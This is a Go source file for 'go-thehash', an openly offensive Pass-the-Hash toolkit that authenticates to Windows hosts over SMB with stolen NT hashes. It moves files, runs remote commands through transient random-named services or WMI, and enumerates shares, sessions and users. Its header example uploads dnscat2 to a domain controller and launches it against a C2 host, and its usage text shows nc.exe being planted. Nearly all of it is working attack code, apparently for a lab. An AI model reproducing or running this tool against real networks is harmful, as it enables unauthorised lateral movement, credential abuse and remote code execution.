// go-thehash: Pass-the-Hash SMB/WMI toolkit.
//
// Authenticates via NTLMv2 using a raw NT hash (no plaintext password,
// no Windows SSPI). Supports SMB2 file operations, remote execution via
// Windows Service Manager (MS-SCMR) or WMI (DCOM), share/session/user
// enumeration via MS-SRVS and MS-SAMR.
//
// ATT&CK: T1550.002 (Pass the Hash), T1569.002 (Service Execution),
//         T1047 (WMI), T1135 (Network Share Discovery),
//         T1087.001 (Local Account Discovery)
//
// # Build (cross-compile to Windows)
//
//	go mod tidy
//	GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o go-thehash.exe .
//
// # Usage
//
//	go-thehash put       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
//	go-thehash get       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
//	go-thehash del       <target> <domain> <user> <nt-hash> <share> <remote-path>
//	go-thehash ls        <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]
//	go-thehash exec      <target> <domain> <user> <nt-hash> <command>
//	go-thehash exec-wmi  <target> <domain> <user> <nt-hash> <command>
//	go-thehash enum      shares   <target> <domain> <user> <nt-hash>
//	go-thehash enum      sessions <target> <domain> <user> <nt-hash>
//	go-thehash enum      users    <target> <domain> <user> <nt-hash> [netbios-computer-name]
//
// # Phase 3 lateral movement example (IIS01 → DC01)
//
//	go-thehash put  DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ "Temp\dnscat2.exe" ./dnscat2.exe
//	go-thehash exec DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "%COMSPEC% /c C:\Windows\Temp\dnscat2.exe --dns host=<C2>,port=53,domain=<domain>"
package main

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/jfjallid/go-smb/dcerpc"
	"github.com/jfjallid/go-smb/dcerpc/mssamr"
	"github.com/jfjallid/go-smb/dcerpc/msscmr"
	"github.com/jfjallid/go-smb/dcerpc/mssrvs"
	"github.com/jfjallid/go-smb/dcerpc/msdcom"
	"github.com/jfjallid/go-smb/dcerpc/smbtransport"
	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/spnego"
	"github.com/jfjallid/go-smb/gss"
)

const letters = "abcdefghijklmnopqrstuvwxyz"

func randName(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// connect establishes an SMB session using Pass-the-Hash (NTLMv2 with NT hash).
// hashHex is the 32-character hex NT hash (e.g. "41c46bf74ec071f65c7b97df4b7d672a").
func connect(target, domain, user, hashHex string) (*smb.Connection, error) {
	hashBytes, err := hex.DecodeString(hashHex)
	if err != nil {
		return nil, fmt.Errorf("invalid NT hash hex: %w", err)
	}
	options := smb.Options{
		Host: target,
		Port: 445,
		Initiator: &spnego.NTLMInitiator{
			User:   user,
			Domain: domain,
			Hash:   hashBytes,
		},
	}
	session, err := smb.NewConnection(options)
	if err != nil {
		return nil, fmt.Errorf("SMB connect to %s: %w", target, err)
	}
	if !session.IsAuthenticated() {
		session.Close()
		return nil, fmt.Errorf("authentication failed for %s\\%s", domain, user)
	}
	return session, nil
}

// putFile uploads a local file to a remote SMB share path.
func putFile(session *smb.Connection, share, remotePath, localPath string) error {
	src, err := os.Open(localPath)
	if err != nil {
		return fmt.Errorf("open local file: %w", err)
	}
	defer src.Close()

	var written int64
	err = session.PutFile(share, remotePath, 0, func(buf []byte) (int, error) {
		n, readErr := src.Read(buf)
		written += int64(n)
		return n, readErr
	})
	if err != nil {
		return fmt.Errorf("PutFile \\\\%s\\%s\\%s: %w", session.GetAuthUsername(), share, remotePath, err)
	}
	fmt.Printf("[+] Uploaded %d bytes → \\\\%s\\%s\\%s\n", written, share, share, remotePath)
	return nil
}

// getFile downloads a file from a remote SMB share path to a local file.
func getFile(session *smb.Connection, share, remotePath, localPath string) error {
	dst, err := os.Create(localPath)
	if err != nil {
		return fmt.Errorf("create local file: %w", err)
	}
	defer dst.Close()

	var received int64
	err = session.RetrieveFile(share, remotePath, 0, func(data []byte) (int, error) {
		n, writeErr := dst.Write(data)
		received += int64(n)
		return n, writeErr
	})
	if err != nil {
		os.Remove(localPath)
		return fmt.Errorf("RetrieveFile \\\\%s\\%s\\%s: %w", share, share, remotePath, err)
	}
	fmt.Printf("[+] Downloaded %d bytes → %s\n", received, localPath)
	return nil
}

// deleteRemoteFile deletes a file on a remote SMB share.
func deleteRemoteFile(session *smb.Connection, share, remotePath string) error {
	if err := session.DeleteFile(share, remotePath); err != nil {
		return fmt.Errorf("DeleteFile \\\\%s\\%s\\%s: %w", share, share, remotePath, err)
	}
	fmt.Printf("[+] Deleted \\\\%s\\%s\\%s\n", share, share, remotePath)
	return nil
}

// listDir lists files in a remote SMB share directory.
// pattern defaults to "*" when empty. Set recurse to list subdirectories.
func listDir(session *smb.Connection, share, dir, pattern string, recurse bool) error {
	if pattern == "" {
		pattern = "*"
	}
	var files []smb.SharedFile
	var err error
	if recurse {
		files, err = session.ListRecurseDirectory(share, dir, pattern)
	} else {
		files, err = session.ListDirectory(share, dir, pattern)
	}
	if err != nil {
		return fmt.Errorf("ListDirectory \\\\%s\\%s\\%s: %w", share, share, dir, err)
	}
	fmt.Printf("[+] %d entries in \\\\%s\\%s\\%s\n\n", len(files), share, share, dir)
	fmt.Printf("%-6s %-20s %12s  %s\n", "Type", "Modified", "Size", "Name")
	fmt.Println(strings.Repeat("-", 60))
	for _, f := range files {
		kind := "file"
		if f.IsDir {
			kind = "dir"
		}
		// Convert Windows FILETIME (100-ns ticks since 1601-01-01) to Unix seconds.
		mtime := time.Unix(int64(f.LastWriteTime/10000000)-11644473600, 0).UTC().Format("2006-01-02 15:04")
		size := ""
		if !f.IsDir {
			size = fmt.Sprintf("%d", f.Size)
		}
		hidden := ""
		if f.IsHidden {
			hidden = " [H]"
		}
		fmt.Printf("%-6s %-20s %12s  %s%s\n", kind, mtime, size, f.Name, hidden)
	}
	return nil
}

// execViaService executes a command on the remote host by creating a transient
// Windows service via MS-SCMR (T1569.002). The service is deleted after launch.
//
// command should be a full binary path, optionally wrapped in cmd.exe:
//
//	"%COMSPEC% /c whoami > C:\Windows\Temp\out.txt"
//	"C:\Windows\Temp\payload.exe"
func execViaService(session *smb.Connection, command string) error {
	if err := session.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("TreeConnect IPC$: %w", err)
	}
	defer session.TreeDisconnect("IPC$")

	pipe, err := session.OpenFile("IPC$", msscmr.MSRPCSvcCtlPipe)
	if err != nil {
		return fmt.Errorf("open svcctl pipe: %w", err)
	}
	defer pipe.CloseFile()

	transport, err := smbtransport.NewSMBTransport(pipe)
	if err != nil {
		return fmt.Errorf("SMB transport: %w", err)
	}

	bind, err := dcerpc.Bind(
		transport,
		msscmr.MSRPCUuidSvcCtl,
		msscmr.MSRPCSvcCtlMajorVersion,
		msscmr.MSRPCSvcCtlMinorVersion,
		dcerpc.MSRPCUuidNdr,
	)
	if err != nil {
		return fmt.Errorf("DCE/RPC bind svcctl: %w", err)
	}

	rpccon := msscmr.NewRPCCon(bind)
	svcName := randName(12)

	err = rpccon.CreateService(
		svcName,
		msscmr.ServiceWin32OwnProcess,
		msscmr.ServiceDemandStart,
		msscmr.ServiceErrorIgnore,
		command,
		"",
		"",
		"",
		false,
	)
	if err != nil {
		return fmt.Errorf("CreateService: %w", err)
	}

	fmt.Printf("[*] Service '%s' created, starting...\n", svcName)

	// ERROR_SERVICE_REQUEST_TIMEOUT (1053) is expected when the payload does
	// not call SetServiceStatus; the command still ran before SCM killed it.
	err = rpccon.StartService(svcName, nil)
	if err != nil {
		if strings.Contains(err.Error(), "timeout") {
			fmt.Printf("[!] Service start timed out (expected — command was dispatched)\n")
		} else {
			_ = rpccon.DeleteService(svcName)
			return fmt.Errorf("StartService: %w", err)
		}
	} else {
		fmt.Printf("[+] Service started successfully\n")
	}

	if err := rpccon.DeleteService(svcName); err != nil {
		fmt.Fprintf(os.Stderr, "[!] DeleteService '%s': %v (non-fatal)\n", svcName, err)
	} else {
		fmt.Printf("[+] Service '%s' deleted\n", svcName)
	}
	return nil
}

// execViaWMI executes a command on the remote host via WMI Win32_Process.Create
// (T1047). Unlike execViaService this does not create a Windows service and
// leaves less SCM artefacts. The spawned process runs under the authenticated
// caller's security context (e.g. TESTLAB\Administrator), not LocalSystem.
//
// hashBytes is the raw 16-byte NT hash (already decoded from hex).
func execViaWMI(target, domain, user string, hashBytes []byte, command string) error {
	opts := msdcom.DCOMOptions{
		MechFactory: func() gss.Mechanism {
			return &spnego.NTLMInitiator{
				User:   user,
				Domain: domain,
				Hash:   hashBytes,
			}
		},
		AuthLevel: dcerpc.RpcAuthnLevelPktPrivacy,
	}

	conn, err := msdcom.NewDCOMConnection(target, opts)
	if err != nil {
		return fmt.Errorf("DCOM connect to %s: %w", target, err)
	}
	defer conn.Close()

	wmi, err := msdcom.NewWMIClient(conn, `//./root/cimv2`)
	if err != nil {
		return fmt.Errorf("WMI NTLMLogin: %w", err)
	}
	defer wmi.Close()

	classDef, err := wmi.GetObject("Win32_Process")
	if err != nil {
		return fmt.Errorf("GetObject Win32_Process: %w", err)
	}

	inParams, err := msdcom.BuildMethodInput(classDef, "Create", map[string]msdcom.MethodParam{
		"CommandLine": msdcom.StringParam(command),
	})
	if err != nil {
		return fmt.Errorf("BuildMethodInput: %w", err)
	}

	outBlob, err := wmi.ExecMethod("Win32_Process", "Create", inParams)
	if err != nil {
		return fmt.Errorf("ExecMethod Win32_Process.Create: %w", err)
	}

	out, err := msdcom.ParseCIMInstanceAllValues(outBlob)
	if err != nil {
		// Non-fatal: command may still have been dispatched
		fmt.Printf("[!] ParseCIMInstanceAllValues: %v (may be non-fatal)\n", err)
	} else {
		if pid, ok := out["ProcessId"]; ok {
			fmt.Printf("[+] Process created, PID = %v\n", pid)
		}
		if rc, ok := out["ReturnValue"]; ok {
			fmt.Printf("[+] ReturnValue = %v\n", rc)
		}
	}
	return nil
}

// bindSrvsvc opens IPC$ and binds to the MS-SRVS (srvsvc) interface.
// The caller must call pipe.CloseFile() and session.TreeDisconnect("IPC$").
func bindSrvsvc(session *smb.Connection) (*mssrvs.RPCCon, func(), error) {
	if err := session.TreeConnect("IPC$"); err != nil {
		return nil, nil, fmt.Errorf("TreeConnect IPC$: %w", err)
	}

	pipe, err := session.OpenFile("IPC$", mssrvs.MSRPCSrvSvcPipe)
	if err != nil {
		session.TreeDisconnect("IPC$")
		return nil, nil, fmt.Errorf("open srvsvc pipe: %w", err)
	}

	transport, err := smbtransport.NewSMBTransport(pipe)
	if err != nil {
		pipe.CloseFile()
		session.TreeDisconnect("IPC$")
		return nil, nil, fmt.Errorf("SMB transport: %w", err)
	}

	bind, err := dcerpc.Bind(
		transport,
		mssrvs.MSRPCUuidSrvSvc,
		mssrvs.MSRPCSrvSvcMajorVersion,
		mssrvs.MSRPCSrvSvcMinorVersion,
		dcerpc.MSRPCUuidNdr,
	)
	if err != nil {
		pipe.CloseFile()
		session.TreeDisconnect("IPC$")
		return nil, nil, fmt.Errorf("DCE/RPC bind srvsvc: %w", err)
	}

	cleanup := func() {
		pipe.CloseFile()
		session.TreeDisconnect("IPC$")
	}
	return mssrvs.NewRPCCon(bind), cleanup, nil
}

// bindSamr opens IPC$ and binds to the MS-SAMR (samr) interface.
func bindSamr(session *smb.Connection) (*mssamr.RPCCon, func(), error) {
	if err := session.TreeConnect("IPC$"); err != nil {
		return nil, nil, fmt.Errorf("TreeConnect IPC$: %w", err)
	}

	pipe, err := session.OpenFile("IPC$", mssamr.MSRPCSamrPipe)
	if err != nil {
		session.TreeDisconnect("IPC$")
		return nil, nil, fmt.Errorf("open samr pipe: %w", err)
	}

	transport, err := smbtransport.NewSMBTransport(pipe)
	if err != nil {
		pipe.CloseFile()
		session.TreeDisconnect("IPC$")
		return nil, nil, fmt.Errorf("SMB transport: %w", err)
	}

	bind, err := dcerpc.Bind(
		transport,
		mssamr.MSRPCUuidSamr,
		mssamr.MSRPCSamrMajorVersion,
		mssamr.MSRPCSamrMinorVersion,
		dcerpc.MSRPCUuidNdr,
	)
	if err != nil {
		pipe.CloseFile()
		session.TreeDisconnect("IPC$")
		return nil, nil, fmt.Errorf("DCE/RPC bind samr: %w", err)
	}

	cleanup := func() {
		pipe.CloseFile()
		session.TreeDisconnect("IPC$")
	}
	return mssamr.NewRPCCon(bind), cleanup, nil
}

// enumShares enumerates all shares on the target via MS-SRVS NetShareEnumAll.
func enumShares(session *smb.Connection, target string) error {
	rpccon, cleanup, err := bindSrvsvc(session)
	if err != nil {
		return err
	}
	defer cleanup()

	shares, err := rpccon.NetShareEnumAll(target)
	if err != nil {
		return fmt.Errorf("NetShareEnumAll: %w", err)
	}

	fmt.Printf("[+] %d share(s) on %s\n\n", len(shares), target)
	fmt.Printf("%-20s %-12s %-6s  %s\n", "Name", "Type", "Hidden", "Comment")
	fmt.Println(strings.Repeat("-", 60))
	for _, s := range shares {
		hidden := "no"
		if s.Hidden {
			hidden = "yes"
		}
		fmt.Printf("%-20s %-12s %-6s  %s\n", s.Name, s.Type, hidden, s.Comment)
	}
	return nil
}

// enumSessions enumerates active SMB sessions on the target via MS-SRVS NetSessionEnum.
func enumSessions(session *smb.Connection) error {
	rpccon, cleanup, err := bindSrvsvc(session)
	if err != nil {
		return err
	}
	defer cleanup()

	res, err := rpccon.NetSessionEnum("", "", 10)
	if err != nil {
		return fmt.Errorf("NetSessionEnum: %w", err)
	}

	ctr := res.Level10
	if ctr == nil || ctr.EntriesRead == 0 {
		fmt.Println("[*] No active sessions")
		return nil
	}

	fmt.Printf("[+] %d active session(s)\n\n", ctr.EntriesRead)
	fmt.Printf("%-30s %-20s %10s  %s\n", "Client", "User", "Time(s)", "IdleTime(s)")
	fmt.Println(strings.Repeat("-", 70))
	for _, e := range ctr.Buffer {
		fmt.Printf("%-30s %-20s %10d  %d\n", e.Cname, e.Username, e.Time, e.IdleTime)
	}
	return nil
}

// enumUsers enumerates local user accounts on the target via MS-SAMR.
// netbiosName is the NetBIOS computer name (e.g. "DC01"); pass "" to auto-detect.
func enumUsers(session *smb.Connection, netbiosName string) error {
	rpccon, cleanup, err := bindSamr(session)
	if err != nil {
		return err
	}
	defer cleanup()

	users, err := rpccon.ListLocalUsers(netbiosName, 500)
	if err != nil {
		return fmt.Errorf("ListLocalUsers: %w", err)
	}

	fmt.Printf("[+] %d user(s)\n\n", len(users))
	fmt.Printf("%-8s  %s\n", "RID", "Name")
	fmt.Println(strings.Repeat("-", 40))
	for _, u := range users {
		fmt.Printf("%-8d  %s\n", u.RelativeId, u.Name.String())
	}
	return nil
}

func usage() {
	fmt.Fprintf(os.Stderr, `go-thehash — Pass-the-Hash SMB/WMI toolkit
ATT&CK: T1550.002, T1569.002, T1047, T1135, T1087.001

Usage:
  go-thehash put       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
  go-thehash get       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
  go-thehash del       <target> <domain> <user> <nt-hash> <share> <remote-path>
  go-thehash ls        <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]
  go-thehash exec      <target> <domain> <user> <nt-hash> <command>
  go-thehash exec-wmi  <target> <domain> <user> <nt-hash> <command>
  go-thehash enum      shares   <target> <domain> <user> <nt-hash>
  go-thehash enum      sessions <target> <domain> <user> <nt-hash>
  go-thehash enum      users    <target> <domain> <user> <nt-hash> [netbios-name]

Arguments:
  target        IP address or hostname of the remote Windows machine
  domain        Windows domain name (use "." for local accounts)
  user          Username (e.g. Administrator)
  nt-hash       32-hex NT hash, no "0x" prefix
  share         SMB share name for put/get/del/ls (e.g. ADMIN$, C$)
  remote-path   Path inside the share (e.g. Temp\payload.exe)
  remote-dir    Directory inside the share to list (e.g. Windows\Temp)
  pattern       File glob pattern for ls (default: *)
  local-path    Local file path for put/get
  command       Full command string; wrap shell builtins:
                  "%%COMSPEC%% /c whoami > C:\Windows\Temp\out.txt"
  netbios-name  NetBIOS computer name for enum users (auto-detected if omitted)

Examples:
  go-thehash put      DC01 TESTLAB Administrator 41c46bf7... ADMIN$ Temp\nc.exe ./nc.exe
  go-thehash get      DC01 TESTLAB Administrator 41c46bf7... C$ Windows\Temp\out.txt ./out.txt
  go-thehash del      DC01 TESTLAB Administrator 41c46bf7... ADMIN$ Temp\nc.exe
  go-thehash ls       DC01 TESTLAB Administrator 41c46bf7... C$ Windows\Temp
  go-thehash ls       DC01 TESTLAB Administrator 41c46bf7... C$ Windows\Temp *.exe
  go-thehash exec     DC01 TESTLAB Administrator 41c46bf7... "%%COMSPEC%% /c whoami > C:\Temp\out.txt"
  go-thehash exec-wmi DC01 TESTLAB Administrator 41c46bf7... "cmd.exe /c whoami > C:\Temp\out.txt"
  go-thehash enum     shares   DC01 TESTLAB Administrator 41c46bf7...
  go-thehash enum     sessions DC01 TESTLAB Administrator 41c46bf7...
  go-thehash enum     users    DC01 TESTLAB Administrator 41c46bf7... DC01
`)
	os.Exit(1)
}

func main() {
	if len(os.Args) < 2 {
		usage()
	}

	subcmd := os.Args[1]

	switch subcmd {
	// ── put ─────────────────────────────────────────────────────────────────
	case "put":
		if len(os.Args) != 9 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash put <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		share, remotePath, localPath := os.Args[6], os.Args[7], os.Args[8]

		session, err := connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := putFile(session, share, remotePath, localPath); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// ── get ─────────────────────────────────────────────────────────────────
	case "get":
		if len(os.Args) != 9 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash get <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		share, remotePath, localPath := os.Args[6], os.Args[7], os.Args[8]

		session, err := connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := getFile(session, share, remotePath, localPath); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// ── del ─────────────────────────────────────────────────────────────────
	case "del":
		if len(os.Args) != 8 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash del <target> <domain> <user> <nt-hash> <share> <remote-path>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		share, remotePath := os.Args[6], os.Args[7]

		session, err := connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := deleteRemoteFile(session, share, remotePath); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// ── ls ──────────────────────────────────────────────────────────────────
	case "ls":
		// ls <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]
		if len(os.Args) < 8 || len(os.Args) > 9 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash ls <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		share, dir := os.Args[6], os.Args[7]
		pattern := ""
		if len(os.Args) == 9 {
			pattern = os.Args[8]
		}

		session, err := connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := listDir(session, share, dir, pattern, false); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// ── exec (service) ──────────────────────────────────────────────────────
	case "exec":
		if len(os.Args) != 7 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash exec <target> <domain> <user> <nt-hash> <command>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		command := os.Args[6]

		session, err := connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := execViaService(session, command); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// ── exec-wmi ────────────────────────────────────────────────────────────
	case "exec-wmi":
		if len(os.Args) != 7 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash exec-wmi <target> <domain> <user> <nt-hash> <command>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		command := os.Args[6]

		hashBytes, err := hex.DecodeString(hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] invalid NT hash hex: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[*] WMI exec as %s\\%s → %s\n", domain, user, target)

		if err := execViaWMI(target, domain, user, hashBytes, command); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// ── enum ────────────────────────────────────────────────────────────────
	case "enum":
		if len(os.Args) < 7 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash enum <shares|sessions|users> <target> <domain> <user> <nt-hash> [netbios-name]")
			os.Exit(1)
		}
		action := os.Args[2]
		target, domain, user, hashHex := os.Args[3], os.Args[4], os.Args[5], os.Args[6]

		session, err := connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n\n", domain, user)

		switch action {
		case "shares":
			if err := enumShares(session, target); err != nil {
				fmt.Fprintf(os.Stderr, "[-] %v\n", err)
				os.Exit(1)
			}
		case "sessions":
			if err := enumSessions(session); err != nil {
				fmt.Fprintf(os.Stderr, "[-] %v\n", err)
				os.Exit(1)
			}
		case "users":
			netbiosName := ""
			if len(os.Args) >= 8 {
				netbiosName = os.Args[7]
			}
			if err := enumUsers(session, netbiosName); err != nil {
				fmt.Fprintf(os.Stderr, "[-] %v\n", err)
				os.Exit(1)
			}
		default:
			fmt.Fprintf(os.Stderr, "Unknown enum action: %s (choose: shares, sessions, users)\n\n", action)
			usage()
		}

	default:
		fmt.Fprintf(os.Stderr, "Unknown subcommand: %s\n\n", subcmd)
		usage()
	}
}
